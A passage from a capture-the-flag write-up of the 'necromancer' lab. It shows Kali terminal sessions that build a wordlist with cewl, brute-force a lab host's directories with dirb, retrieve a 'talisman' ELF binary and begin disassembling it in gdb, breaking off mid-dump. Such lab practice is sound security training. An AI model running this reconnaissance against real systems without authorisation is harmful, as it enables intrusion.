<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# man cewl</span><br><span class="line">root@kali:~/ctf/necromancer# cewl https://en.wikipedia.org/wiki/List_of_mythological_objects -d 0 &gt; wordlist.txt</span><br><span class="line">root@kali:~/ctf/necromancer# dirb http://10.0.2.10/ wordlist.txt -w</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Dec 17 20:06:17 2017</span><br><span class="line">URL_BASE: http://10.0.2.10/</span><br><span class="line">WORDLIST_FILES: wordlist.txt</span><br><span class="line">OPTION: Not Stopping on warning messages</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 6151</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://10.0.2.10/ ----</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sun Dec 17 20:06:22 2017</span><br><span class="line">DOWNLOADED: 6151 - FOUND: 0</span><br><span class="line"></span><br><span class="line">root@kali:~/ctf/necromancer# dirb http://10.0.2.10/amagicbridgeappearsatthechasm/ wordlist.txt -w</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Dec 17 20:07:03 2017</span><br><span class="line">URL_BASE: http://10.0.2.10/amagicbridgeappearsatthechasm/</span><br><span class="line">WORDLIST_FILES: wordlist.txt</span><br><span class="line">OPTION: Not Stopping on warning messages</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 6151</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://10.0.2.10/amagicbridgeappearsatthechasm/ ----</span><br><span class="line">+ http://10.0.2.10/amagicbridgeappearsatthechasm/talisman (CODE:200|SIZE:9676)</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sun Dec 17 20:07:16 2017</span><br><span class="line">DOWNLOADED: 6151 - FOUND: 1</span><br></pre></td></tr></table></figure>
<p>It turns out that the magical item is a talisman and the corresponding directory is not at base level but rather behind <code>amagicbridgeappearsatthechasm</code>. The URL prompts a file download, which is then inspected:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# file talisman</span><br><span class="line">talisman: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2b131df906087adf163f8cba1967b3d2766e639d, not stripped</span><br><span class="line">root@kali:~/ctf/necromancer# chmod +x talisman</span><br></pre></td></tr></table></figure>
<p>We identify the file as a x32 ELF executable. Depending on the system one might need the 32-bit version of libc to execute it.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# ./talisman</span><br><span class="line">You have found a talisman.</span><br><span class="line"></span><br><span class="line">The talisman is cold to the touch, and has no words or symbols on it&apos;s surface.</span><br><span class="line"></span><br><span class="line">Do you want to wear the talisman?  Yes</span><br><span class="line"></span><br><span class="line">Nothing happens.</span><br></pre></td></tr></table></figure>
<p>No matter what I input, nothing happens. With <code>gdb</code>, however, we are in control:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# gdb ./talisman</span><br><span class="line">GNU gdb (Debian 7.12-6+b1) 7.12.0.20161007-git</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from ./talisman...(no debugging symbols found)...done.</span><br><span class="line">(gdb) set disassembly-flavor intel</span><br><span class="line">(gdb) disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x08048a13 &lt;+0&gt;:	lea    ecx,[esp+0x4]</span><br><span class="line">   0x08048a17 &lt;+4&gt;:	and    esp,0xfffffff0</span><br><span class="line">   0x08048a1a &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x08048a1d &lt;+10&gt;:	push   ebp</span><br><span class="line">   0x08048a1e &lt;+11&gt;:	mov    ebp,esp</span><br><span class="line">   0x08048a20 &lt;+13&gt;:	push   ecx</span><br><span class="line">   0x08048a21 &lt;+14&gt;:	sub    esp,0x4</span><br><span class="line">   0x08048a24 &lt;+17&gt;:	call   0x8048529 &lt;wearTalisman&gt;</span><br><span class="line">   0x08048a29 &lt;+22&gt;:	mov    eax,0x0</span><br><span class="line">   0x08048a2e &lt;+27&gt;:	add    esp,0x4</span><br><span class="line">   0x08048a31 &lt;+30&gt;:	pop    ecx</span><br><span class="line">   0x08048a32 &lt;+31&gt;:	pop    ebp</span><br><span class="line">   0x08048a33 &lt;+32&gt;:	lea    esp,[ecx-0x4]</span><br><span class="line">   0x08048a36 &lt;+35&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">(gdb) disassemble wearTalisman</span><br><span class="line">Dump of assembler code for function wearTalisman:</span><br><span class="line">   0x08048529 &lt;+0&gt;:	push   ebp</span><br><span class="line">   0x0804852a &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x0804852c &lt;+3&gt;:	push   edi</span><br><span class="line">   0x0804852d &lt;+4&gt;:	sub    esp,0x1b4</span><br><span class="line">   0x08048533 &lt;+10&gt;:	lea    edx,[ebp-0x1ac]</span><br><span class="line">   0x08048539 &lt;+16&gt;:	mov    eax,0x0</span><br><span class="line">   0x0804853e &lt;+21&gt;:	mov    ecx,0x64</span><br><span class="line">   0x08048543 &lt;+26&gt;:	mov    edi,edx</span><br><span class="line">   0x08048545 &lt;+28&gt;:	rep stos DWORD PTR es:[edi],eax</span><br><span class="line">   0x08048547 &lt;+30&gt;:	mov    BYTE PTR [ebp-0x1ac],0xec</span><br><span class="line">   0x0804854e &lt;+37&gt;:	mov    BYTE PTR [ebp-0x1ab],0x9d</span><br><span class="line">   0x08048555 &lt;+44&gt;:	mov    BYTE PTR [ebp-0x1aa],0x49</span><br><span class="line">   0x0804855c &lt;+51&gt;:	mov    BYTE PTR [ebp-0x1a9],0x81</span><br><span class="line">   0x08048563 &lt;+58&gt;:	mov    BYTE PTR [ebp-0x1a8],0xdd</span><br><span class="line">   0x0804856a &lt;+65&gt;:	mov    BYTE PTR [ebp-0x1a7],0x93</span><br><span class="line">   0x08048571 &lt;+72&gt;:	mov    BYTE PTR [ebp-0x1a6],0x4a</span><br><span class="line">   0x08048578 &lt;+79&gt;:	mov    BYTE PTR [ebp-0x1a5],0xc4</span><br><span class="line">   0x0804857f &lt;+86&gt;:	mov    BYTE PTR [ebp-0x1a4],0x95</span><br><span class="line">   0x08048586 &lt;+93&gt;:	mov    BYTE PTR [ebp-0x1a3],0x94</span><br><span class="line">   0x0804858d &lt;+100&gt;:	mov    BYTE PTR [ebp-0x1a2],0x53</span><br><span class="line">   0x08048594 &lt;+107&gt;:	mov    BYTE PTR [ebp-0x1a1],0xd4</span><br><span class="line">   0x0804859b &lt;+114&gt;:	mov    BYTE PTR [ebp-0x1a0],0xdb</span><br><span class="line">   0x080485a2 &lt;+121&gt;:	mov    BYTE PTR [ebp-0x19f],0x96</span><br><span class="line">   0x080485a9 &lt;+128&gt;:	mov    BYTE PTR [ebp-0x19e],0x1c</span><br><span class="line">   0x080485b0 &lt;+135&gt;:	mov    BYTE PTR [ebp-0x19d],0xc0</span><br><span class="line">   0x080485b7 &lt;+142&gt;:	mov    BYTE PTR [ebp-0x19c],0x95</span><br><span class="line">   0x080485be &lt;+149&gt;:	mov    BYTE PTR [ebp-0x19b],0x86</span><br><span class="line">   0x080485c5 &lt;+156&gt;:	mov    BYTE PTR [ebp-0x19a],0x5d</span><br><span class="line">   0x080485cc &lt;+163&gt;:	mov    BYTE PTR [ebp-0x199],0xcd</span><br><span class="line">   0x080485d3 &lt;+170&gt;:	mov    BYTE PTR [ebp-0x198],0xdc</span><br><span class="line">   0x080485da &lt;+177&gt;:	mov    BYTE PTR [ebp-0x197],0x81</span><br><span class="line">   0x080485e1 &lt;+184&gt;:	mov    BYTE PTR [ebp-0x196],0x51</span><br><span class="line">   0x080485e8 &lt;+191&gt;:	mov    BYTE PTR [ebp-0x195],0xc0</span><br><span class="line">   0x080485ef &lt;+198&gt;:	mov    BYTE PTR [ebp-0x194],0xdb</span><br><span class="line">   0x080485f6 &lt;+205&gt;:	mov    BYTE PTR [ebp-0x193],0xdc</span><br><span class="line">   0x080485fd &lt;+212&gt;:	mov    BYTE PTR [ebp-0x192],0x36</span><br><span class="line">   0x08048604 &lt;+219&gt;:	mov    BYTE PTR [ebp-0x191],0xab</span><br><span class="line">   0x0804860b &lt;+226&gt;:	mov    BYTE PTR [ebp-0x190],0xb5</span><br><span class="line">   0x08048612 &lt;+233&gt;:	mov    BYTE PTR [ebp-0x148],0xe1</span><br><span class="line">   0x08048619 &lt;+240&gt;:	mov    BYTE PTR [ebp-0x147],0x9a</span><br><span class="line">   0x08048620 &lt;+247&gt;:	mov    BYTE PTR [ebp-0x146],0x59</span><br><span class="line">   0x08048627 &lt;+254&gt;:	mov    BYTE PTR [ebp-0x145],0x81</span><br><span class="line">   0x0804862e &lt;+261&gt;:	mov    BYTE PTR [ebp-0x144],0xc1</span><br><span class="line">   0x08048635 &lt;+268&gt;:	mov    BYTE PTR [ebp-0x143],0x93</span><br><span class="line">   0x0804863c &lt;+275&gt;:	mov    BYTE PTR [ebp-0x142],0x50</span><br><span class="line">   0x08048643 &lt;+282&gt;:	mov    BYTE PTR [ebp-0x141],0xc8</span><br><span class="line">   0x0804864a &lt;+289&gt;:	mov    BYTE PTR [ebp-0x140],0xc6</span><br><span class="line">   0x08048651 &lt;+296&gt;:	mov    BYTE PTR [ebp-0x13f],0x9f</span><br><span class="line">   0x08048658 &lt;+303&gt;:	mov    BYTE PTR [ebp-0x13e],0x5d</span><br><span class="line">   0x0804865f &lt;+310&gt;:	mov    BYTE PTR [ebp-0x13d],0xcf</span><br><span class="line">   0x08048666 &lt;+317&gt;:	mov    BYTE PTR [ebp-0x13c],0x95</span><br><span class="line">   0x0804866d &lt;+324&gt;:	mov    BYTE PTR [ebp-0x13b],0x9b</span><br><span class="line">   0x08048674 &lt;+331&gt;:	mov    BYTE PTR [ebp-0x13a],0x4f</span><br><span class="line">   0x0804867b &lt;+338&gt;:	mov    BYTE PTR [ebp-0x139],0x81</span><br><span class="line">   0x08048682 &lt;+345&gt;:	mov    BYTE PTR [ebp-0x138],0xd6</span><br><span class="line">   0x08048689 &lt;+352&gt;:	mov    BYTE PTR [ebp-0x137],0x9d</span><br><span class="line">   0x08048690 &lt;+359&gt;:	mov    BYTE PTR [ebp-0x136],0x50</span><br><span class="line">   0x08048697 &lt;+366&gt;:	mov    BYTE PTR [ebp-0x135],0xc5</span><br><span class="line">   0x0804869e &lt;+373&gt;:	mov    BYTE PTR [ebp-0x134],0x95</span><br><span class="line">   0x080486a5 &lt;+380&gt;:	mov    BYTE PTR [ebp-0x133],0x86</span><br><span class="line">   0x080486ac &lt;+387&gt;:	mov    BYTE PTR [ebp-0x132],0x53</span><br><span class="line">   0x080486b3 &lt;+394&gt;:	mov    BYTE PTR [ebp-0x131],0x81</span><br><span class="line">   0x080486ba &lt;+401&gt;:	mov    BYTE PTR [ebp-0x130],0xc1</span><br><span class="line">   0x080486c1 &lt;+408&gt;:	mov    BYTE PTR [ebp-0x12f],0x9a</span><br><span class="line">   0x080486c8 &lt;+415&gt;:	mov    BYTE PTR [ebp-0x12e],0x59</span><br><span class="line">   0x080486cf &lt;+422&gt;:	mov    BYTE PTR [ebp-0x12d],0x81</span><br><span class="line">   0x080486d6 &lt;+429&gt;:	mov    BYTE PTR [ebp-0x12c],0xc1</span><br><span class="line">   0x080486dd &lt;+436&gt;:	mov    BYTE PTR [ebp-0x12b],0x9d</span><br><span class="line">   0x080486e4 &lt;+443&gt;:	mov    BYTE PTR [ebp-0x12a],0x49</span><br><span class="line">   0x080486eb &lt;+450&gt;:	mov    BYTE PTR [ebp-0x129],0xc2</span><br><span class="line">   0x080486f2 &lt;+457&gt;:	mov    BYTE PTR [ebp-0x128],0xdd</span><br><span class="line">   0x080486f9 &lt;+464&gt;:	mov    BYTE PTR [ebp-0x127],0xde</span><br><span class="line">   0x08048700 &lt;+471&gt;:	mov    BYTE PTR [ebp-0x126],0x1c</span><br><span class="line">   0x08048707 &lt;+478&gt;:	mov    BYTE PTR [ebp-0x125],0xc0</span><br><span class="line">   0x0804870e &lt;+485&gt;:	mov    BYTE PTR [ebp-0x124],0xdb</span><br><span class="line">   0x08048715 &lt;+492&gt;:	mov    BYTE PTR [ebp-0x123],0x96</span><br><span class="line">   0x0804871c &lt;+499&gt;:	mov    BYTE PTR [ebp-0x122],0x1c</span><br><span class="line">   0x08048723 &lt;+506&gt;:	mov    BYTE PTR [ebp-0x121],0xc9</span><br><span class="line">   0x0804872a &lt;+513&gt;:	mov    BYTE PTR [ebp-0x120],0xd4</span><br><span class="line">   0x08048731 &lt;+520&gt;:	mov    BYTE PTR [ebp-0x11f],0x81</span><br><span class="line">   0x08048738 &lt;+527&gt;:	mov    BYTE PTR [ebp-0x11e],0x1c</span><br><span class="line">   0x0804873f &lt;+534&gt;:	mov    BYTE PTR [ebp-0x11d],0xcf</span><br><span class="line">   0x08048746 &lt;+541&gt;:	mov    BYTE PTR [ebp-0x11c],0xda</span><br><span class="line">   0x0804874d &lt;+548&gt;:	mov    BYTE PTR [ebp-0x11b],0xd2</span><br><span class="line">   0x08048754 &lt;+555&gt;:	mov    BYTE PTR [ebp-0x11a],0x4b</span><br><span class="line">   0x0804875b &lt;+562&gt;:	mov    BYTE PTR [ebp-0x119],0xce</span><br><span class="line">   0x08048762 &lt;+569&gt;:	mov    BYTE PTR [ebp-0x118],0xc7</span><br><span class="line">   0x08048769 &lt;+576&gt;:	mov    BYTE PTR [ebp-0x117],0x96</span><br><span class="line">   0x08048770 &lt;+583&gt;:	mov    BYTE PTR [ebp-0x116],0x4f</span><br><span class="line">   0x08048777 &lt;+590&gt;:	mov    BYTE PTR [ebp-0x115],0x81</span><br><span class="line">   0x0804877e &lt;+597&gt;:	mov    BYTE PTR [ebp-0x114],0xda</span><br><span class="line">   0x08048785 &lt;+604&gt;:	mov    BYTE PTR [ebp-0x113],0x80</span><br><span class="line">   0x0804878c &lt;+611&gt;:	mov    BYTE PTR [ebp-0x112],0x1c</span><br><span class="line">   0x08048793 &lt;+618&gt;:	mov    BYTE PTR [ebp-0x111],0xd2</span><br><span class="line">   0x0804879a &lt;+625&gt;:	mov    BYTE PTR [ebp-0x110],0xcc</span><br><span class="line">   0x080487a1 &lt;+632&gt;:	mov    BYTE PTR [ebp-0x10f],0x9f</span><br><span class="line">   0x080487a8 &lt;+639&gt;:	mov    BYTE PTR [ebp-0x10e],0x5e</span><br><span class="line">   0x080487af &lt;+646&gt;:	mov    BYTE PTR [ebp-0x10d],0xce</span><br><span class="line">   0x080487b6 &lt;+653&gt;:	mov    BYTE PTR [ebp-0x10c],0xd9</span><br><span class="line">   0x080487bd &lt;+660&gt;:	mov    BYTE PTR [ebp-0x10b],0x81</span><br><span class="line">   0x080487c4 &lt;+667&gt;:	mov    BYTE PTR [ebp-0x10a],0x1c</span><br><span class="line">   0x080487cb &lt;+674&gt;:	mov    BYTE PTR [ebp-0x109],0xce</span><br><span class="line">   0x080487d2 &lt;+681&gt;:	mov    BYTE PTR [ebp-0x108],0xdb</span><br><span class="line">   0x080487d9 &lt;+688&gt;:	mov    BYTE PTR [ebp-0x107],0xd2</span><br><span class="line">   0x080487e0 &lt;+695&gt;:	mov    BYTE PTR [ebp-0x106],0x55</span><br><span class="line">   0x080487e7 &lt;+702&gt;:	mov    BYTE PTR [ebp-0x105],0xd5</span><br><span class="line">   0x080487ee &lt;+709&gt;:	mov    BYTE PTR [ebp-0x104],0x92</span><br><span class="line">   0x080487f5 &lt;+716&gt;:	mov    BYTE PTR [ebp-0x103],0x81</span><br><span class="line">   0x080487fc &lt;+723&gt;:	mov    BYTE PTR [ebp-0x102],0x1c</span><br><span class="line">   0x08048803 &lt;+730&gt;:	mov    BYTE PTR [ebp-0x101],0xd2</span><br><span class="line">   0x0804880a &lt;+737&gt;:	mov    BYTE PTR [ebp-0x100],0xc0</span><br><span class="line">   0x08048811 &lt;+744&gt;:	mov    BYTE PTR [ebp-0xff],0x80</span><br><span class="line">   0x08048818 &lt;+751&gt;:	mov    BYTE PTR [ebp-0xfe],0x5a</span><br><span class="line">   0x0804881f &lt;+758&gt;:	mov    BYTE PTR [ebp-0xfd],0xc0</span><br><span class="line">   0x08048826 &lt;+765&gt;:	mov    BYTE PTR [ebp-0xfc],0xd6</span><br><span class="line">   0x0804882d &lt;+772&gt;:	mov    BYTE PTR [ebp-0xfb],0x97</span><br><span class="line">   0x08048834 &lt;+779&gt;:	mov    BYTE PTR [ebp-0xfa],0x12</span><br><span class="line">   0x0804883b &lt;+786&gt;:	mov    BYTE PTR [ebp-0xf9],0xab</span><br><span class="line">   0x08048842 &lt;+793&gt;:	mov    BYTE PTR [ebp-0xf8],0xbf</span><br><span class="line">   0x08048849 &lt;+800&gt;:	mov    BYTE PTR [ebp-0xf7],0xf2</span><br><span class="line">   0x08048850 &lt;+807&gt;:	mov    BYTE PTR [ebp-0xe4],0xf1</span><br><span class="line">   0x08048857 &lt;+814&gt;:	mov    BYTE PTR [ebp-0xe3],0x9d</span><br><span class="line">   0x0804885e &lt;+821&gt;:	mov    BYTE PTR [ebp-0xe2],0x1c</span><br><span class="line">   0x08048865 &lt;+828&gt;:	mov    BYTE PTR [ebp-0xe1],0xd8</span><br><span class="line">   0x0804886c &lt;+835&gt;:	mov    BYTE PTR [ebp-0xe0],0xda</span><br><span class="line">   0x08048873 &lt;+842&gt;:	mov    BYTE PTR [ebp-0xdf],0x87</span><br><span class="line">   0x0804887a &lt;+849&gt;:	mov    BYTE PTR [ebp-0xde],0x1c</span><br><span class="line">   0x08048881 &lt;+856&gt;:	mov    BYTE PTR [ebp-0xdd],0xd6</span><br><span class="line">   0x08048888 &lt;+863&gt;:	mov    BYTE PTR [ebp-0xdc],0xd4</span><br><span class="line">   0x0804888f &lt;+870&gt;:	mov    BYTE PTR [ebp-0xdb],0x9c</span><br><span class="line">   0x08048896 &lt;+877&gt;:	mov    BYTE PTR [ebp-0xda],0x48</span><br><span class="line">   0x0804889d &lt;+884&gt;:	mov    BYTE PTR [ebp-0xd9],0x81</span><br><span class="line">   0x080488a4 &lt;+891&gt;:	mov    BYTE PTR [ebp-0xd8],0xc1</span><br><span class="line">   0x080488ab &lt;+898&gt;:	mov    BYTE PTR [ebp-0xd7],0x9d</span><br><span class="line">   0x080488b2 &lt;+905&gt;:	mov    BYTE PTR [ebp-0xd6],0x1c</span><br><span class="line">   0x080488b9 &lt;+912&gt;:	mov    BYTE PTR [ebp-0xd5],0xd6</span><br><span class="line">   0x080488c0 &lt;+919&gt;:	mov    BYTE PTR [ebp-0xd4],0xd0</span><br><span class="line">   0x080488c7 &lt;+926&gt;:	mov    BYTE PTR [ebp-0xd3],0x93</span><br><span class="line">   0x080488ce &lt;+933&gt;:	mov    BYTE PTR [ebp-0xd2],0x4e</span><br><span class="line">   0x080488d5 &lt;+940&gt;:	mov    BYTE PTR [ebp-0xd1],0x81</span><br><span class="line">   0x080488dc &lt;+947&gt;:	mov    BYTE PTR [ebp-0xd0],0xc1</span><br><span class="line">   0x080488e3 &lt;+954&gt;:	mov    BYTE PTR [ebp-0xcf],0x9a</span><br><span class="line">   0x080488ea &lt;+961&gt;:	mov    BYTE PTR [ebp-0xce],0x59</span><br><span class="line">   0x080488f1 &lt;+968&gt;:	mov    BYTE PTR [ebp-0xcd],0x81</span><br><span class="line">   0x080488f8 &lt;+975&gt;:	mov    BYTE PTR [ebp-0xcc],0xc1</span><br><span class="line">   0x080488ff &lt;+982&gt;:	mov    BYTE PTR [ebp-0xcb],0x93</span><br><span class="line">   0x08048906 &lt;+989&gt;:	mov    BYTE PTR [ebp-0xca],0x50</span><br><span class="line">   0x0804890d &lt;+996&gt;:	mov    BYTE PTR [ebp-0xc9],0xc8</span><br><span class="line">   0x08048914 &lt;+1003&gt;:	mov    BYTE PTR [ebp-0xc8],0xc6</span><br><span class="line">   0x0804891b &lt;+1010&gt;:	mov    BYTE PTR [ebp-0xc7],0x9f</span><br><span class="line">   0x08048922 &lt;+1017&gt;:	mov    BYTE PTR [ebp-0xc6],0x5d</span><br><span class="line">   0x08048929 &lt;+1024&gt;:	mov    BYTE PTR [ebp-0xc5],0xcf</span><br><span class="line">   0x08048930 &lt;+1031&gt;:	mov    BYTE PTR [ebp-0xc4],0x8a</span><br><span class="line">   0x08048937 &lt;+1038&gt;:	mov    BYTE PTR [ebp-0xc3],0xd2</span><br><span class="line">   0x0804893e &lt;+1045&gt;:	mov    BYTE PTR [ebp-0xc2],0x1c</span><br><span class="line">   0x08048945 &lt;+1052&gt;:	mov    BYTE PTR [ebp-0xc1],0xa1</span><br><span class="line">   